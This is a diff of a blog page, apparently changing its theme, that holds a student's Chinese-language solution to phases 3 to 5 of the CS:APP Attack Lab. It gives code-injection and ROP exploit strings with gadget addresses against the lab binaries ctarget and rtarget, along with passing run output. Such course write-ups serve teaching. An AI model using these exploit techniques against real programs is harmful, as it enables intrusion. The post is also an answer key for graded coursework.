-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">phase3.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 c8 f7 66 55    mov    $0x5566f7c8,%rdi</span><br><span class="line">   7:   68 a0 17 40 00          pushq  $0x4017a0</span><br><span class="line">   c:   c3                      retq</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">phase3.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 c8 f7 66 55    mov    $0x5566f7c8,%rdi</span><br><span class="line">   7:   68 a0 17 40 00          pushq  $0x4017a0</span><br><span class="line">   c:   c3                      retq</span><br></pre></td></tr></table></figure>
 <p>查表得出cookie字符串的16进制表示为36 33 31 34 39 33 38  30，注意：以字符串形势比较时不用再反转输入，且字符串应有结尾字符‘\0’，得到攻击字符串如下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 c8 f7 66 55 68</span><br><span class="line">a0 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">a8 f7 66 55 00 00 00 00</span><br><span class="line">36 33 31 34 39 33 38 30</span><br><span class="line">00</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 c8 f7 66 55 68</span><br><span class="line">a0 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">a8 f7 66 55 00 00 00 00</span><br><span class="line">36 33 31 34 39 33 38 30</span><br><span class="line">00</span><br></pre></td></tr></table></figure>
 <p>转换输入运行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase3 | ./ctarget -q</span><br><span class="line">Cookie: 0x63149380</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="string">"63149380"</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	2017211523</span><br><span class="line">	course	f18</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	117:PASS:0xffffffff:ctarget:3:48 C7 C7 C8 F7 66 55 68 A0 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00 36 33 31 34 39 33 38 30 00</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase3 | ./ctarget -q</span><br><span class="line">Cookie: 0x63149380</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="hljs-string">"63149380"</span>)</span><br><span class="line">Valid solution <span class="hljs-keyword">for</span> level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	2017211523</span><br><span class="line">	course	f18</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	117:PASS:0xffffffff:ctarget:3:48 C7 C7 C8 F7 66 55 68 A0 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00 36 33 31 34 39 33 38 30 00</span><br></pre></td></tr></table></figure>
 <h4 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h4><p>在此阶段，程序添加了两个现代计算机程序几乎必须的对抗缓缓冲区溢出攻击的措施：  </p>
 <p>1.函数栈随机化 ，无法再获取绝对地址。  </p>
 <p>2.栈内存的内容被锁定为不可执行。  </p>
 <p>故此，我们需要使用ROP(面向返回编程)，即使用程序中本来就存在的代码组成我们需要的操作，再将其地址作为返回值，不断用ret指令返回完成所需操作。</p>
 <h4 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h4><p>此关需用ROP方法完成phase_2内容。那么就需要在操作中得到cookie值，那么只有用pop指令了，需要指令为。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popq 	%rax</span><br><span class="line">movq	%rax,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popq 	%rax</span><br><span class="line">movq	%rax,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
 <p>查找官方的write up，得知对应机器码，然后在在rtarget文件的反汇编文件中利用vim查找对应代码地址。将其放入攻击字符串，得到攻击字符串为。  </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">3c 18 40 00 00 00 00 00	/*	popq rax		*/</span><br><span class="line">80 93 14 63 00 00 00 00	/*	cookie			*/</span><br><span class="line">49 18 40 00 00 00 00 00	/*	movq %rax,%rdi 	*/</span><br><span class="line">cc 16 40 00 00 00 00 00 /*	touch2			*/</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">3c 18 40 00 00 00 00 00	/*	popq rax		*/</span><br><span class="line">80 93 14 63 00 00 00 00	/*	cookie			*/</span><br><span class="line">49 18 40 00 00 00 00 00	/*	movq %rax,%rdi 	*/</span><br><span class="line">cc 16 40 00 00 00 00 00 /*	touch2			*/</span><br></pre></td></tr></table></figure>
 <p>转换输入运行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase4 | ./rtarget </span><br><span class="line">Cookie: 0x63149380</span><br><span class="line">Type string:Touch2!: You called touch2(0x63149380)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target rtarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase4 | ./rtarget </span><br><span class="line">Cookie: 0x63149380</span><br><span class="line">Type string:Touch2!: You called touch2(0x63149380)</span><br><span class="line">Valid solution <span class="hljs-keyword">for</span> level 2 with target rtarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>
 <h4 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h4><p>此关为phase_3的ROP版本，我们需要查找start_farm到end_farm中的gadgets，拼凑出代码实现phase_3中插入代码的功能。还需注意：  </p>
 <p>1.0x90代表nop，除了将pc加1之外不做任何事。  </p>
 <p>2.不分双字节指令，设置标志位，不改变寄存器的值，可以使用。 </p>
 <p>需要的指令有</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">movq	%rsp,%rax</span><br><span class="line">movq	%rax,%rdi</span><br><span class="line">popq	%rax</span><br><span class="line">movl	%eax,%ecx</span><br><span class="line">movl	%ecx,%edx</span><br><span class="line">movl	%edx,%esi</span><br><span class="line">lea(%rdi, %rsi, 1),%rax</span><br><span class="line">movq	%rax,%rdi</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">movq	%rsp,%rax</span><br><span class="line">movq	%rax,%rdi</span><br><span class="line">popq	%rax</span><br><span class="line">movl	%eax,%ecx</span><br><span class="line">movl	%ecx,%edx</span><br><span class="line">movl	%edx,%esi</span><br><span class="line">lea(%rdi, %rsi, 1),%rax</span><br><span class="line">movq	%rax,%rdi</span><br></pre></td></tr></table></figure>
 <p>则攻击字符串为</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">bd 18 40 00 00 00 00 00	/*	gadget1			*/</span><br><span class="line">49 18 40 00 00 00 00 00	/*	gadget2			*/</span><br><span class="line">30 18 40 00 00 00 00 00	/* 	gadget3			*/</span><br><span class="line">48 00 00 00 00 00 00 00	/*	cookie字符串偏移量*/</span><br><span class="line">13 19 40 00 00 00 00 00	/*	gadget4			*/</span><br><span class="line">ca 18 40 00 00 00 00 00	/*	gadget5			*/</span><br><span class="line">b7 18 40 00 00 00 00 00	/*	gadget6			*/</span><br><span class="line">69 18 40 00 00 00 00 00	/*	gadget7			*/</span><br><span class="line">49 18 40 00 00 00 00 00	/*	gadget8			*/</span><br><span class="line">a0 17 40 00 00 00 00 00 /*	touch3地址   	   */</span><br><span class="line">36 33 31 34 39 33 38 30 /* 	cookie字符串	  */</span><br><span class="line">00</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">bd 18 40 00 00 00 00 00	/*	gadget1			*/</span><br><span class="line">49 18 40 00 00 00 00 00	/*	gadget2			*/</span><br><span class="line">30 18 40 00 00 00 00 00	/* 	gadget3			*/</span><br><span class="line">48 00 00 00 00 00 00 00	/*	cookie字符串偏移量*/</span><br><span class="line">13 19 40 00 00 00 00 00	/*	gadget4			*/</span><br><span class="line">ca 18 40 00 00 00 00 00	/*	gadget5			*/</span><br><span class="line">b7 18 40 00 00 00 00 00	/*	gadget6			*/</span><br><span class="line">69 18 40 00 00 00 00 00	/*	gadget7			*/</span><br><span class="line">49 18 40 00 00 00 00 00	/*	gadget8			*/</span><br><span class="line">a0 17 40 00 00 00 00 00 /*	touch3地址   	   */</span><br><span class="line">36 33 31 34 39 33 38 30 /* 	cookie字符串	  */</span><br><span class="line">00</span><br></pre></td></tr></table></figure>
 <p>转换文件运行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase5 | ./rtarget </span><br><span class="line">Cookie: 0x63149380</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="string">"63149380"</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target rtarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase5 | ./rtarget </span><br><span class="line">Cookie: 0x63149380</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="hljs-string">"63149380"</span>)</span><br><span class="line">Valid solution <span class="hljs-keyword">for</span> level 3 with target rtarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>
 <h3 id="到此为止"><a href="#到此为止" class="headerlink" title="到此为止"></a>到此为止</h3>
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/CS-APP/" rel="tag"># CS:APP</a>
-          
-            <a href="/tags/汇编/" rel="tag"># 汇编</a>
-          
-            <a href="/tags/代码注入攻击/" rel="tag"># 代码注入攻击</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2018/12/01/Bomb_lab2/" rel="next" title="Bomb_lab2">
-                <i class="fa fa-chevron-left"></i> Bomb_lab2
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/12/09/Python数据清洗初步/" rel="prev" title="Python数据清洗初步">
-                Python数据清洗初步 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-
-    <div class="post-spread">
-      
-    </div>
-  </div>
-
-
-          </div>
-          
-
-
-          
-
-  
-
-
-
         </div>
         
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Overview
-          </li>
-        </ul>
-      
-
-      <section class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image" src="/images/head.jpeg" alt="Wmc">
-            
-              <p class="site-author-name" itemprop="name">Wmc</p>
-              <p class="site-description motion-element" itemprop="description"></p>
-          </div>
-
-          <nav class="site-state motion-element">
-
-            
-              <div class="site-state-item site-state-posts">
-              
-                <a href="/archives/">
-              
-                  <span class="site-state-item-count">11</span>
-                  <span class="site-state-item-name">posts</span>
-                </a>
-              </div>
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-categories">
-                <a href="/categories/index.html">
-                  <span class="site-state-item-count">7</span>
-                  <span class="site-state-item-name">categories</span>
-                </a>
-              </div>
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-tags">
-                <a href="/tags/index.html">
-                  <span class="site-state-item-count">17</span>
-                  <span class="site-state-item-name">tags</span>
-                </a>
-              </div>
-            
-
-          </nav>
-
-          
-            <div class="feed-link motion-element">
-              <a href="/atom.xml" rel="alternate">
-                <i class="fa fa-rss"></i>
-                RSS
-              </a>
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/CS-APP/">CS:APP</a>, <a class="has-link-grey -link" href="/tags/代码注入攻击/">代码注入攻击</a>, <a class="has-link-grey -link" href="/tags/汇编/">汇编</a>
+                </div>
             </div>
-          
-
-          
-            <div class="links-of-author motion-element">
-                
-                  <span class="links-of-author-item">
-                    <a href="https://github.com/Jason210314" target="_blank" title="GitHub">
-                      
-                        <i class="fa fa-fw fa-github"></i>GitHub</a>
-                  </span>
-                
-                  <span class="links-of-author-item">
-                    <a href="mailto:wmc314@outlook.com" target="_blank" title="E-Mail">
-                      
-                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
-                  </span>
-                
-                  <span class="links-of-author-item">
-                    <a href="https://blog.csdn.net/deepmind210" target="_blank" title="CSDN">
-                      
-                        <i class="fa fa-fw fa-link"></i>CSDN</a>
-                  </span>
-                
-            </div>
-          
-
-          
-          
-
-          
-          
-            <div class="links-of-blogroll motion-element links-of-blogroll-block">
-              <div class="links-of-blogroll-title">
-                <i class="fa  fa-fw fa-link"></i>
-                Links
-              </div>
-              <ul class="links-of-blogroll-list">
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://sprinter1999.github.io" title="学分" target="_blank">学分</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://rinchannow.club" title="何萌妹" target="_blank">何萌妹</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://ipotato.me" title="gay直" target="_blank">gay直</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://qjx.app" title="Q哥" target="_blank">Q哥</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://kuso-kodo.name1e5s.top" title="于大佬" target="_blank">于大佬</a>
-                  </li>
-                
-              </ul>
-            </div>
-          
-
-          
-
         </div>
-      </section>
-
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#实验描述"><span class="nav-number">1.</span> <span class="nav-text">实验描述</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#第一阶段"><span class="nav-number">1.1.</span> <span class="nav-text">第一阶段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phase-1"><span class="nav-number">1.2.</span> <span class="nav-text">phase_1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phase-2"><span class="nav-number">1.3.</span> <span class="nav-text">phase_2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phase-3"><span class="nav-number">1.4.</span> <span class="nav-text">phase_3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第二阶段"><span class="nav-number">1.5.</span> <span class="nav-text">第二阶段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phase-4"><span class="nav-number">1.6.</span> <span class="nav-text">phase_4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phase-5"><span class="nav-number">1.7.</span> <span class="nav-text">phase_5</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#到此为止"><span class="nav-number">2.</span> <span class="nav-text">到此为止</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
-      
-
-      
-
-    </div>
-  </aside>
-
-
         
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Wmc</span>
-
-  
+        
+        
+    </div>
 </div>
 
 
-  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
 
 
 
-  <span class="post-meta-divider">|</span>
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        <div class="level-start">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2018/12/09/Python数据清洗初步/">
+                <i class="level-item fas fa-chevron-left"></i>
+                <span class="level-item">Python数据清洗初步</span>
+            </a>
+        </div>
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2018/12/01/Bomb_lab2/">
+                <span class="level-item">Bomb_lab2</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+</div>
+                
 
 
 
-  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
 
-
-
-
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered">
+                <div>
+                    
+                        <img class="image is-128x128 has-mb-6" src="/images/head.jpeg" alt="Wmc">
+                    
+                    
+                    <p class="is-size-4 is-block">
+                        Wmc
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        For fun
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>BUPT</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        Posts
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        11
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        Categories
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        7
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        Tags
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        17
+                    </p>
+                </div>
+            </div>
+        </nav>
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://github.com/Jason210314" target="_blank">
+                Follow</a>
+        </div>
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank" title="Github" href="https://github.com/Jason210314">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank" title="RSS" href="/">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+    
+        
+    
         
 
+<div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            Links
+        </h3>
+        <ul class="menu-list">
+        
+            <li>
+                <a class="level is-mobile" href="mailto:wmc314@outlook.com" target="_blank">
+                    <span class="level-left">
+                        <span class="level-item">E-Mail</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag"></span>
+                    </span>
+                </a>
+            </li>
+        
+            <li>
+                <a class="level is-mobile" href="https://blog.csdn.net/deepmind210" target="_blank">
+                    <span class="level-left">
+                        <span class="level-item">CSDN</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">blog.csdn.net</span>
+                    </span>
+                </a>
+            </li>
+        
+            <li>
+                <a class="level is-mobile" href="https://sprinter1999.github.icon" target="_blank">
+                    <span class="level-left">
+                        <span class="level-item">学分</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">sprinter1999.github.icon</span>
+                    </span>
+                </a>
+            </li>
+        
+            <li>
+                <a class="level is-mobile" href="http://rinchannow.club" target="_blank">
+                    <span class="level-left">
+                        <span class="level-item">何萌妹</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">rinchannow.club</span>
+                    </span>
+                </a>
+            </li>
+        
+            <li>
+                <a class="level is-mobile" href="https://ipotato.me" target="_blank">
+                    <span class="level-left">
+                        <span class="level-item">gay直</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">ipotato.me</span>
+                    </span>
+                </a>
+            </li>
+        
+            <li>
+                <a class="level is-mobile" href="https://qjx.app" target="_blank">
+                    <span class="level-left">
+                        <span class="level-item">Q哥</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">qjx.app</span>
+                    </span>
+                </a>
+            </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
 
 
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                Categories
+            </h3>
+            <ul class="menu-list">
+            <li>
+        <a class="level is-marginless" href="/categories/CS-APP/">
+            <span class="level-start">
+                <span class="level-item">CS:APP</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">5</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/DeepLearning/">
+            <span class="level-start">
+                <span class="level-item">DeepLearning</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/Python/">
+            <span class="level-start">
+                <span class="level-item">Python</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/python/">
+            <span class="level-start">
+                <span class="level-item">python</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a><ul><li>
+        <a class="level is-marginless" href="/categories/python/tensorflow/">
+            <span class="level-start">
+                <span class="level-item">tensorflow</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li></ul></li><li>
+        <a class="level is-marginless" href="/categories/数据结构/">
+            <span class="level-start">
+                <span class="level-item">数据结构</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">3</span>
+            </span>
+        </a></li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            Tag Cloud
+        </h3>
+        <a href="/tags/Basic-NN/" style="font-size: 10px;">Basic NN</a> <a href="/tags/CS-APP/" style="font-size: 20px;">CS:APP</a> <a href="/tags/ElementTree/" style="font-size: 10px;">ElementTree</a> <a href="/tags/Logistic/" style="font-size: 10px;">Logistic</a> <a href="/tags/Queue/" style="font-size: 10px;">Queue</a> <a href="/tags/Stack/" style="font-size: 10px;">Stack</a> <a href="/tags/XML/" style="font-size: 10px;">XML</a> <a href="/tags/c/" style="font-size: 10px;">c</a> <a href="/tags/linux内核/" style="font-size: 10px;">linux内核</a> <a href="/tags/ubuntu/" style="font-size: 10px;">ubuntu</a> <a href="/tags/串匹配/" style="font-size: 10px;">串匹配</a> <a href="/tags/二进制炸弹/" style="font-size: 13.33px;">二进制炸弹</a> <a href="/tags/代码注入攻击/" style="font-size: 10px;">代码注入攻击</a> <a href="/tags/广义表/" style="font-size: 10px;">广义表</a> <a href="/tags/数据清洗/" style="font-size: 10px;">数据清洗</a> <a href="/tags/汇编/" style="font-size: 16.67px;">汇编</a> <a href="/tags/迷宫问题/" style="font-size: 10px;">迷宫问题</a>
+    </div>
+</div>
 
-
-
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen ">
+        
+            
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            Recent
+        </h3>
+        
+        <article class="media">
+            
+            <a href="/2019/03/09/DeepLearning1/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="DeepLearning1">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-03-09T12:45:21.000Z">2019-03-09</time></div>
+                    <a href="/2019/03/09/DeepLearning1/" class="has-link-black-ter is-size-6">DeepLearning1</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/DeepLearning/">DeepLearning</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
